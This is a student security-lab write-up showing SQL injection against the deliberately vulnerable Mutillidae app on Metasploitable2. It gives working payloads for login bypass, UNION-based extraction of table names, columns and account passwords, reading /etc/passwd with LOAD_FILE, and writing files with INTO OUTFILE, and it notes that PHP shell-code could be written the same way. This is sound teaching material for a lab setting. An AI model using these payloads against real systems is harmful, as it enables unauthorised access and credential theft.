# EXP.NO:8
# DATE:23-04-2024
# Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## ALGORITHM:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2



![Screenshot 2024-04-28 131911](https://github.com/Vinothini1711/sqlinjection/assets/144300204/198d1535-7b5d-4492-9aa6-baa472534fc7)


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.




![Screenshot 2024-04-30 110741](https://github.com/Vinothini1711/sqlinjection/assets/144300204/ff2bd300-b3e1-46bb-91f4-2a4b6874cdbb)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:



![Screenshot 2024-04-30 110904](https://github.com/Vinothini1711/sqlinjection/assets/144300204/02d55ea0-8116-41cc-9b75-dafdf933c188)
Click on the menu Login/Register and register for an account



![Screenshot 2024-04-28 193018](https://github.com/Vinothini1711/sqlinjection/assets/144300204/ce31926c-0d27-4f2a-a46f-5f7f056fe588)

Click on the link “Please register here”



![Screenshot 2024-04-30 081233](https://github.com/Vinothini1711/sqlinjection/assets/144300204/2186e847-a3a7-48ba-a656-0ca19718aaf5)

Click on “Create Account” to display the following page:

![Screenshot 2024-04-30 092831](https://github.com/Vinothini1711/sqlinjection/assets/144300204/04375208-ce3b-4988-ac82-c8bc426b70e6)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![Screenshot 2024-04-30 093016](https://github.com/Vinothini1711/sqlinjection/assets/144300204/35ec8c25-10e9-4a43-8464-fa8a304c039a)

Click “Login”. The logged in page will show as below:
![Screenshot 2024-04-30 093033](https://github.com/Vinothini1711/sqlinjection/assets/144300204/3611f4f7-2117-4ef0-ae30-709a05598d79)



##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 

![Screenshot 2024-04-30 111614](https://github.com/Vinothini1711/sqlinjection/assets/144300204/8451bf1e-ad82-41c4-b644-a9fd29da32a4)

Click the login button and you will see it enter into the administrator page.

![Screenshot 2024-04-30 111715](https://github.com/Vinothini1711/sqlinjection/assets/144300204/a3a7b5e7-f41d-4749-bace-c4c45dd30212)

## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:
![Screenshot 2024-04-30 112438](https://github.com/Vinothini1711/sqlinjection/assets/144300204/4b45fc76-5fda-4f26-91d8-03cb161286c5)

![Screenshot 2024-04-30 112524](https://github.com/Vinothini1711/sqlinjection/assets/144300204/91f2ba95-95b0-4b2a-b978-ac713c6e7075)

![Screenshot 2024-04-30 112551](https://github.com/Vinothini1711/sqlinjection/assets/144300204/806f091c-79d7-43e8-af29-b1c0f5d65935)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![Screenshot 2024-04-30 113149](https://github.com/Vinothini1711/sqlinjection/assets/144300204/b31502fb-9285-451b-9b5a-21e89970b7f7)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:
http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=vinothini%27order%20by6%23&password=vino1234&user-info-php-submit-button=View+Account+Details
![Screenshot 2024-04-30 113349](https://github.com/Vinothini1711/sqlinjection/assets/144300204/777b08d3-3bad-4997-baa3-4b932313b69d)

After adding the order by 6 into the existing url , the following error statement will be obtained:
When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![Screenshot 2024-04-30 113535](https://github.com/Vinothini1711/sqlinjection/assets/144300204/e41236a5-5cb9-4a46-aed5-2489f03dd850)

 As it is having 5 columns the query worked fine and it provides the correct result

![Screenshot 2024-04-30 113735](https://github.com/Vinothini1711/sqlinjection/assets/144300204/722bdabe-a704-4e18-8ace-80ee5a4c61b0)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![Screenshot 2024-04-30 113926](https://github.com/Vinothini1711/sqlinjection/assets/144300204/975cf64a-6c77-4cff-91fa-888a6f921aad)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![Screenshot 2024-04-30 114053](https://github.com/Vinothini1711/sqlinjection/assets/144300204/c822f6b0-e577-4e22-81a7-fbf79967db36)
 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=vinothini%27union%20select%201,database(),user(),version(),5%23&password=vino1234&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-04-30 114538](https://github.com/Vinothini1711/sqlinjection/assets/144300204/35af072e-0fc-4617-8c4c-c53dd480212f)
![Screenshot 2024-04-30 114523](https://github.com/Vinothini1711/sqlinjection/assets/144300204/687da22d-2fc0-4bfd-bc3f-f77a23a0b0e9)


The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=vinothini%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=vino1234&user-info-php-submit-button=View+Account+Details
![Screenshot 2024-04-30 115954](https://github.com/Vinothini1711/sqlinjection/assets/144300204/775331d9-f935-436a-87e1-6deb568bc918)


The url once executed will  retrieve table names from the “owasp 10” database.
##Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
The column names of the accounts is displayed below for the following url:
http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=vinothini%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=vino1234&user-info-php-submit-button=View+Account+Details 


![Screenshot 2024-04-30 120953](https://github.com/Vinothini1711/sqlinjection/assets/144300204/0dec79c7-4b40-4a9d-80d0-3cd6efae30d4)


Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=vinothini%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=vino1234&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-04-30 121356](https://github.com/Vinothini1711/sqlinjection/assets/144300204/682e6024-f183-4d1f-8599-64d9e9a655d2)

## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=vinothini%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=vino1234&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-04-30 121539](https://github.com/Vinothini1711/sqlinjection/assets/144300204/3eb6d01b-524b-4d48-acc5-04ad0356d31b)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).



## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
